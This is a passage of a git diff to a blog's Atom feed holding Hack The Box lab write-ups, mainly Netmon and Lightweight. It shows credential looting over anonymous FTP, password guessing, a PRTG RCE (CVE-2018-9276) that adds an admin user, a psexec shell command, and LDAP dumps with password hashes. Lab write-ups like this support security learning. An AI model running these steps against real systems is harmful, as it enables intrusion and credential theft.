&quot;OsNumberOfLicensedUsers&quot;: null, &quot;OsNumberOfProcesses&quot;: null, &quot;OsNumberOfUsers&quot;: null, &quot;OsOrganization&quot;: null, &quot;OsArchitecture&quot;: null, &quot;OsLanguage&quot;: null, &quot;OsProductSuites&quot;: null, &quot;OsOtherTypeDescription&quot;: null, &quot;OsPAEEnabled&quot;: null, &quot;OsPortableOperatingSystem&quot;: null, &quot;OsPrimary&quot;: null, &quot;OsProductType&quot;: null, &quot;OsRegisteredUser&quot;: null, &quot;OsSerialNumber&quot;: null, &quot;OsServicePackMajorVersion&quot;: null, &quot;OsServicePackMinorVersion&quot;: null, &quot;OsStatus&quot;: null, &quot;OsSuites&quot;: null, &quot;OsServerLevel&quot;: 4, &quot;KeyboardLayout&quot;: null, &quot;TimeZone&quot;: &quot;(UTC-08:00) Pacific Time (US \u0026 Canada)&quot;, &quot;LogonServer&quot;: null, &quot;PowerPlatformRole&quot;: 1, &quot;HyperVisorPresent&quot;: null, &quot;HyperVRequirementDataExecutionPreventionAvailable&quot;: null, &quot;HyperVRequirementSecondLevelAddressTranslation&quot;: null, &quot;HyperVRequirementVirtualizationFirmwareEnabled&quot;: null, &quot;HyperVRequirementVMMonitorModeExtensions&quot;: null, &quot;DeviceGuardSmartStatus&quot;: 0, &quot;DeviceGuardRequiredSecurityProperties&quot;: null, &quot;DeviceGuardAvailableSecurityProperties&quot;: null, &quot;DeviceGuardSecurityServicesConfigured&quot;: null, &quot;DeviceGuardSecurityServicesRunning&quot;: null, &quot;DeviceGuardCodeIntegrityPolicyEnforcementStatus&quot;: null, &quot;DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus&quot;: null } /services lists the services, that’s also important and we might need it later : ``` root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services [ { “name”: “AJRouter”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “AllJoyn Router Service”, “status”: “OK” }, { “name”: “ALG”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “Application Layer Gateway Service”, “status”: “OK” }, { “name”: “AppHostSvc”, “startname”: “localSystem”, “displayname”: “Application Host Helper Service”, “status”: “OK” },</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/hackback/0.png" /></entry><entry><title type="html">Hack The Box - Netmon</title><link href="http://localhost:4000/hack-the-box/netmon/" rel="alternate" type="text/html" title="Hack The Box - Netmon" /><published>2019-06-29T00:00:00+02:00</published><updated>2019-06-29T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/netmon</id><content type="html" xml:base="http://localhost:4000/hack-the-box/netmon/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-netmon-retired-and-heres-my-writeup-about-it-it-was-a-very-easy-machine-thats-everything-i-can-say-about-it-its-a-windows-box-and-its-ip-is-101010152-i-added-it-to-etchosts-as-netmonhtb-lets-jump-right-in-&quot;&gt;Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;netmon.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -179,7 +1258,8 @@ ftp&amp;gt;
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---querier&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="ftp" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as netmon.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC netmon.htb We got ftp on port 21, http on port 80 and smb. The most interesting thing is that anonymous login is allowed on ftp and obviously it’s running on C: ! FTP, User Flag I checked that ftp server and got the user flag for Public : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM &amp;lt;DIR&amp;gt; inetpub 07-16-16 09:18AM &amp;lt;DIR&amp;gt; PerfLogs 02-25-19 10:56PM &amp;lt;DIR&amp;gt; Program Files 02-03-19 12:28AM &amp;lt;DIR&amp;gt; Program Files (x86) 02-03-19 08:08AM &amp;lt;DIR&amp;gt; Users 02-25-19 11:49PM &amp;lt;DIR&amp;gt; Windows 226 Transfer complete. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd Public 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Downloads 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Music 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Pictures 06-28-19 06:49AM 82 tester.txt 02-03-19 12:35AM 33 user.txt 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Videos 226 Transfer complete. ftp&amp;gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0.07 secs (0.4790 kB/s) ftp&amp;gt; We owned user. PRTG Credentials I checked the http service and found a web application called PRTG Network Monitor. However we need credentials to access the application. We have access to C: through the ftp server so we can search for credentials there. I searched for the place where PRTG configuration files are saved and found it was in C:\Users\All Users\Application Data\Paessler\PRTG Network Monitor so I went there and downloaded the configuration files : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 07-16-16 09:28AM &amp;lt;DIR&amp;gt; All Users 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Default 07-16-16 09:28AM &amp;lt;DIR&amp;gt; Default User 07-16-16 09:16AM 174 desktop.ini 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd &quot;All Users&quot; 250 CWD command successful. ftp&amp;gt; ls -al 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Application Data 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Desktop 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 02-03-19 12:15AM &amp;lt;DIR&amp;gt; Licenses 11-20-16 10:36PM &amp;lt;DIR&amp;gt; Microsoft 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Paessler 02-03-19 08:05AM &amp;lt;DIR&amp;gt; regid.1991-06.com.microsoft 07-16-16 09:18AM &amp;lt;DIR&amp;gt; SoftwareDistribution 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Start Menu 02-03-19 12:15AM &amp;lt;DIR&amp;gt; TEMP 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Templates 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOPrivate 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOShared 02-25-19 10:56PM &amp;lt;DIR&amp;gt; VMware 226 Transfer complete. ftp&amp;gt; cd &quot;Application Data/Paessler/PRTG Network Monitor&quot; 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Configuration Auto-Backups 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Log Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Debug) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Sensors) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (System) 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Logs (Web Server) 02-25-19 08:01PM &amp;lt;DIR&amp;gt; Monitoring Database 06-28-19 06:54AM 1287578 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 06-28-19 06:25AM 1647701 PRTG Graph Data Cache.dat 02-25-19 11:00PM &amp;lt;DIR&amp;gt; Report PDFs 02-03-19 12:18AM &amp;lt;DIR&amp;gt; System Information Database 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Ticket Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; ToDo Database 226 Transfer complete. ftp&amp;gt; get &quot;PRTG Configuration.dat&quot; local: PRTG Configuration.dat remote: PRTG Configuration.dat 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1287578 bytes received in 3.43 secs (366.5319 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old&quot; local: PRTG Configuration.old remote: PRTG Configuration.old 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1189697 bytes received in 3.05 secs (380.7779 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old.bak&quot; local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1153755 bytes received in 3.04 secs (370.2494 kB/s) ftp&amp;gt; Knowing that the default admin user for PRTG is prtgadmin I searched for that string in the 3 configuration files : cat * | grep -A 20 -B 20 &quot;prtgadmin&quot; I got the password which was PrTg@dmin2018 : However it didn’t work, after some attempts I changed it to PrTg@dmin2019 and it worked : RCE, Root Flag After searching for authenticated exploits I found CVE-2018-9276 which was an authenticated RCE vulnerability. I used this exploit which exploits the RCE and creates a new Administrator user (This works because PRTG runs as system) : New user credentials : pentest:P3nT3st!. I used psexec.py from impacket to get a shell : psexec.py pentest:'P3nT3st!'@netmon.htb And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Querier</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/netmon/0.png" /></entry><entry><title type="html">Hack The Box - Querier (Commando)</title><link href="http://localhost:4000/hack-the-box/querier-2/" rel="alternate" type="text/html" title="Hack The Box - Querier (Commando)" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier-2</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier-2/">&lt;hr /&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---hackback&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/hackback/&quot;&gt;Hack The Box - Hackback&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="ftp" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as netmon.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC netmon.htb We got ftp on port 21, http on port 80 and smb. The most interesting thing is that anonymous login is allowed on ftp and obviously it’s running on C: ! FTP, User Flag I checked that ftp server and got the user flag for Public : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:18AM 1024 .rnd 02-25-19 10:15PM &amp;lt;DIR&amp;gt; inetpub 07-16-16 09:18AM &amp;lt;DIR&amp;gt; PerfLogs 02-25-19 10:56PM &amp;lt;DIR&amp;gt; Program Files 02-03-19 12:28AM &amp;lt;DIR&amp;gt; Program Files (x86) 02-03-19 08:08AM &amp;lt;DIR&amp;gt; Users 02-25-19 11:49PM &amp;lt;DIR&amp;gt; Windows 226 Transfer complete. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd Public 250 CWD command successful. ftp&amp;gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Downloads 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Music 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Pictures 06-28-19 06:49AM 82 tester.txt 02-03-19 12:35AM 33 user.txt 07-16-16 09:18AM &amp;lt;DIR&amp;gt; Videos 226 Transfer complete. ftp&amp;gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0.07 secs (0.4790 kB/s) ftp&amp;gt; We owned user. PRTG Credentials I checked the http service and found a web application called PRTG Network Monitor. However we need credentials to access the application. We have access to C: through the ftp server so we can search for credentials there. I searched for the place where PRTG configuration files are saved and found it was in C:\Users\All Users\Application Data\Paessler\PRTG Network Monitor so I went there and downloaded the configuration files : root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb Connected to netmon.htb. 220 Microsoft FTP Service Name (netmon.htb:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&amp;gt; cd Users 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 11:44PM &amp;lt;DIR&amp;gt; Administrator 07-16-16 09:28AM &amp;lt;DIR&amp;gt; All Users 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Default 07-16-16 09:28AM &amp;lt;DIR&amp;gt; Default User 07-16-16 09:16AM 174 desktop.ini 06-28-19 06:43AM &amp;lt;DIR&amp;gt; Public 226 Transfer complete. ftp&amp;gt; cd &quot;All Users&quot; 250 CWD command successful. ftp&amp;gt; ls -al 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Application Data 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Desktop 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Documents 02-03-19 12:15AM &amp;lt;DIR&amp;gt; Licenses 11-20-16 10:36PM &amp;lt;DIR&amp;gt; Microsoft 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Paessler 02-03-19 08:05AM &amp;lt;DIR&amp;gt; regid.1991-06.com.microsoft 07-16-16 09:18AM &amp;lt;DIR&amp;gt; SoftwareDistribution 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Start Menu 02-03-19 12:15AM &amp;lt;DIR&amp;gt; TEMP 02-03-19 08:05AM &amp;lt;DIR&amp;gt; Templates 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOPrivate 11-20-16 10:19PM &amp;lt;DIR&amp;gt; USOShared 02-25-19 10:56PM &amp;lt;DIR&amp;gt; VMware 226 Transfer complete. ftp&amp;gt; cd &quot;Application Data/Paessler/PRTG Network Monitor&quot; 250 CWD command successful. ftp&amp;gt; ls -la 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Configuration Auto-Backups 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Log Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Debug) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (Sensors) 02-03-19 12:18AM &amp;lt;DIR&amp;gt; Logs (System) 06-28-19 06:24AM &amp;lt;DIR&amp;gt; Logs (Web Server) 02-25-19 08:01PM &amp;lt;DIR&amp;gt; Monitoring Database 06-28-19 06:54AM 1287578 PRTG Configuration.dat 02-25-19 10:54PM 1189697 PRTG Configuration.old 07-14-18 03:13AM 1153755 PRTG Configuration.old.bak 06-28-19 06:25AM 1647701 PRTG Graph Data Cache.dat 02-25-19 11:00PM &amp;lt;DIR&amp;gt; Report PDFs 02-03-19 12:18AM &amp;lt;DIR&amp;gt; System Information Database 02-03-19 12:40AM &amp;lt;DIR&amp;gt; Ticket Database 02-03-19 12:18AM &amp;lt;DIR&amp;gt; ToDo Database 226 Transfer complete. ftp&amp;gt; get &quot;PRTG Configuration.dat&quot; local: PRTG Configuration.dat remote: PRTG Configuration.dat 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1287578 bytes received in 3.43 secs (366.5319 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old&quot; local: PRTG Configuration.old remote: PRTG Configuration.old 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1189697 bytes received in 3.05 secs (380.7779 kB/s) ftp&amp;gt; get &quot;PRTG Configuration.old.bak&quot; local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1153755 bytes received in 3.04 secs (370.2494 kB/s) ftp&amp;gt; Knowing that the default admin user for PRTG is prtgadmin I searched for that string in the 3 configuration files : cat * | grep -A 20 -B 20 &quot;prtgadmin&quot; I got the password which was PrTg@dmin2018 : However it didn’t work, after some attempts I changed it to PrTg@dmin2019 and it worked : RCE, Root Flag After searching for authenticated exploits I found CVE-2018-9276 which was an authenticated RCE vulnerability. I used this exploit which exploits the RCE and creates a new Administrator user (This works because PRTG runs as system) : New user credentials : pentest:P3nT3st!. I used psexec.py from impacket to get a shell : psexec.py pentest:'P3nT3st!'@netmon.htb And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Querier Next Hack The Box write-up : Hack The Box - Hackback</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/netmon/0.png" /></entry><entry><title type="html">Hack The Box - Querier (Commando)</title><link href="http://localhost:4000/hack-the-box/querier-2/" rel="alternate" type="text/html" title="Hack The Box - Querier (Commando)" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier-2</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier-2/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-this-is-the-second-post-for-querier-you-can-read-the-first-post-here-in-the-first-post-i-solved-it-with-kali-in-this-post-i-will-solve-it-with-commando-vm-queriers-ip-is-101010125-i-added-it-to-cwindowssystem32driversetchosts-as-querierhtb-lets-jump-right-in-&quot;&gt;Hey guys this is the second post for Querier, you can read the first post &lt;a href=&quot;/hack-the-box/querier&quot;&gt;here&lt;/a&gt;. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -3608,340 +4688,4 @@ Response.Write(thisDir)%&amp;gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---lightweight&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lightweight/&quot;&gt;Hack The Box - Lightweight&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---chaos&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chaos/&quot;&gt;Hack The Box - Chaos&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Networking" /><category term="ftp" /><category term="Web" /><category term="RCE" /><summary type="html">Quick Summary Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining IPSEC connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is 10.10.10.116, I added it to /etc/hosts as conceal.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services. nmap -sV -sT -sC conceal.htb And we got nothing ! I ran another nmap UDP scan on all ports : nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0 The output was too long so I will show the only important part : It was not sure about port 161, but it showed that port 500 is open. I ran a third scan on ports 500 and 161 : nmap -p 161,500 -sV -sU -sC conceal.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb Nmap scan report for conceal.htb (10.10.10.116) Host is up (0.20s latency).</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/conceal/0.png" /></entry><entry><title type="html">Hack The Box - Lightweight</title><link href="http://localhost:4000/hack-the-box/lightweight/" rel="alternate" type="text/html" title="Hack The Box - Lightweight" /><published>2019-05-11T00:00:00+02:00</published><updated>2019-05-11T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lightweight</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lightweight/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys-today-lightweight-retired-and-heres-my-write-up-about-it-lightweight-was-a-simple-and-a-straightforward-machine-i-had-fun-solving-it-and-i-liked-it-the-idea-behind-the-box-is-simple-we-get-initial-ssh-access-then-keep-escalating-privileges-until-we-reach-root-its-a-linux-machine-and-its-ip-is-101010119-i-added-it-to-etchosts-as-lightweighthtb-lets-jump-right-in&quot;&gt;Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.119&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;lightweight.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lightweight/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC lightweight.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/lightweight/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;3-ports-are-open--22-running-ssh-80-running-http-and-389-running-ldap-lets-check-ldap-first&quot;&gt;3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;ldap-enumeration&quot;&gt;Ldap Enumeration&lt;/h3&gt;
-&lt;h4 id=&quot;to-enumerate-ldap-i-like-to-use-a-tool-called-ldapsearch-theres-also-an-nmap-script-called-ldap-search-that-can-do-the-same-thing&quot;&gt;To enumerate ldap I like to use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt;, There’s also an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; script called &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt; that can do the same thing.&lt;/h4&gt;
-&lt;h4 id=&quot;ldapsearch-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot;&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# extended LDIF
-#
-# LDAPv3
-# base &amp;lt;dc=lightweight,dc=htb&amp;gt; with scope subtree
-# filter: (objectclass=*)
-# requesting: ALL
-#
-
-# lightweight.htb
-dn: dc=lightweight,dc=htb
-objectClass: top
-objectClass: dcObject
-objectClass: organization
-o: lightweight htb
-dc: lightweight
-
-# Manager, lightweight.htb
-dn: cn=Manager,dc=lightweight,dc=htb
-objectClass: organizationalRole
-cn: Manager
-description: Directory Manager
-
-# People, lightweight.htb
-dn: ou=People,dc=lightweight,dc=htb
-objectClass: organizationalUnit
-ou: People
-
-# Group, lightweight.htb
-dn: ou=Group,dc=lightweight,dc=htb
-objectClass: organizationalUnit
-ou: Group
-
-# ldapuser1, People, lightweight.htb
-dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
-uid: ldapuser1
-cn: ldapuser1
-sn: ldapuser1
-mail: ldapuser1@lightweight.htb
-objectClass: person
-objectClass: organizationalPerson
-objectClass: inetOrgPerson
-objectClass: posixAccount
-objectClass: top
-objectClass: shadowAccount
-userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
- oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
-shadowLastChange: 17691
-shadowMin: 0
-shadowMax: 99999
-shadowWarning: 7
-loginShell: /bin/bash
-uidNumber: 1000
-gidNumber: 1000
-homeDirectory: /home/ldapuser1
-
-# ldapuser2, People, lightweight.htb
-dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
-uid: ldapuser2
-cn: ldapuser2
-sn: ldapuser2
-mail: ldapuser2@lightweight.htb
-objectClass: person
-objectClass: organizationalPerson
-objectClass: inetOrgPerson
-objectClass: posixAccount
-objectClass: top
-objectClass: shadowAccount
-userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
- zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
-shadowLastChange: 17691
-shadowMin: 0
-shadowMax: 99999
-shadowWarning: 7
-loginShell: /bin/bash
-uidNumber: 1001
-gidNumber: 1001
-homeDirectory: /home/ldapuser2
-
-# ldapuser1, Group, lightweight.htb
-dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
-objectClass: posixGroup
-objectClass: top
-cn: ldapuser1
-userPassword:: e2NyeXB0fXg=
-gidNumber: 1000
-
-# ldapuser2, Group, lightweight.htb
-dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
-objectClass: posixGroup
-objectClass: top
-cn: ldapuser2
-userPassword:: e2NyeXB0fXg=
-gidNumber: 1001
-
-# search result
-search: 2
-result: 0 Success
-
-# numResponses: 9
-# numEntries: 8
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;nmap-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap --script=ldap-search lightweight.htb&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 10 17:10:46 2019 as: nmap --script=ldap-search -o ldap.nmap lightweight.htb
